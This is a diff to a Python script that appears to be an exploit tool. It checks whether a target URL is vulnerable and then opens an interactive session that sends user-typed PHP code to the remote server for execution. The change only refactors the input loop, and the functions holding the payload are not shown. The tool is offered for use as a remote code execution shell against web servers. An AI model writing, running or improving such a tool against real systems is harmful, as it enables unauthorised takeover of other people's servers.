@@ -2,6 +2,7 @@ import requests
 import base64
 import sys
 import readline
+from functools import partial
 
 print(r"""
        _               _             _         _____   _____ ______ 
@@ -58,11 +59,11 @@ if __name__ == "__main__":
     if check(url,header):
         print('\033[1;32mThe vulnerability exists！ \033[0m')
         print("Type exit to exit the session......\n")
-        while True:
-            payload = input("input php_code>")
-            if payload in "exit":
-                print("Byebye!")
-                break
+
+        inputNew = partial(input,'input php_code>')
+        sentinel = 'exit'
+        lines = []
+        for payload in iter(inputNew, sentinel):
             shell(url,header,payload)
     else:
         print('\033[1;31mThere are no bugs or accidents！ \033[0m')
